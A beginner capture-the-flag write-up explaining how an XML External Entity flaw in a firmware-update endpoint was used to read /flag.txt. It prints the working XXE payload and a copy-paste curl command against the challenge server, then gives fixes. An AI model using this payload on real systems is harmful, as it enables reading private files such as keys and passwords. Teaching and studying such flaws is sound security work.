# Jailbreak — Writeup (Beginner-friendly)

**Challenge name:** Jailbreak  
**Points:** 900

---

## Summary (one-sentence)
You exploited an **XML External Entity (XXE)** vulnerability in a firmware update endpoint to read the file `/flag.txt` from the challenge server and retrieve the flag.

---

## What the challenge is
The service accepts an XML firmware update. The XML parser on the server is misconfigured and allows external entities (a feature of XML). By defining an entity that points to a local file and then referencing it inside the XML, the server expands the entity and leaks the file contents back to you.

This is a CTF exercise — do **not** try this on systems you don’t own or have permission to test.

---

## Concepts you need to know (short)
- **XML**: a structured text format (like HTML).  
- **DOCTYPE / ENTITY**: XML has a feature where you can define shortcuts (entities) in a `<!DOCTYPE>` block.  
- **XXE (XML External Entity)**: a vulnerability that happens when an XML parser loads external entities, potentially letting an attacker read local files.

---

## How it works (simple steps)
1. We send an XML document to the server that includes a `<!DOCTYPE>` declaration.  
2. Inside the `DOCTYPE` we define an entity (named `xxe`) that tells the parser to read `file:///flag.txt`.  
3. We reference `&xxe;` inside an element in the XML body (for example inside `<Version>`).  
4. The server’s XML parser replaces `&xxe;` with the contents of `/flag.txt`.  
5. If the server returns or shows the parsed XML, the flag becomes visible to us.

---

## Payload (exact XML you can reuse)
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
    </Firmware>
</FirmwareUpdateConfig>
```

Put that as the POST body to `/api/update` and the application (if vulnerable) will expand `&xxe;` to file contents.

---

## Example `curl` command (copy-paste)
```bash
curl -s -X POST 'http://94.237.57.211:57541/api/update' \
  -H 'Content-Type: application/xml' \
  --data-binary $'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt">]>\n<FirmwareUpdateConfig>\n  <Firmware>\n    <Version>1.33.7&xxe;</Version>\n    <ReleaseDate>2077-10-21</ReleaseDate>\n  </Firmware>\n</FirmwareUpdateConfig>'
```
Run that in Terminal; if the service is vulnerable it will output the server response which will include the expanded contents of `/flag.txt` (the flag).

---

## What you should see
Look in the response for a string that looks like a flag (common formats: `FLAG{...}` or `flag{...}` or similar). The exact format depends on the CTF platform.

---

## Why this is bad (in plain English)
The server is trusted to parse XML safely. Because it allowed the XML parser to read files from the local filesystem, an attacker can trick it into showing secrets (like configuration files, keys, or the flag). In real-world systems, that could expose passwords, private keys, or other sensitive data.

---

## How to fix it (brief)
- Disable DTD and external entity processing in the XML parser.  
- If you don’t need DOCTYPE processing, explicitly block DOCTYPE declarations from untrusted input.  
- Use modern, safe parsing libraries or use JSON where possible.  
- Run the service with the least privilege so files like `/flag.txt` aren’t accessible.

---

## Notes and tips for beginners
- If nothing appears in the response, the server might parse but not display that value — some XXE scenarios require different techniques (blind XXE or out-of-band exfiltration).  
- Always confirm you are posting to the correct URL and port shown in the challenge.  
- Keep your README short and show the exact payload and curl command — judges like reproducible steps.

---

## License / Attribution
Writeup created for a CTF challenge. Do not use on unauthorized systems.
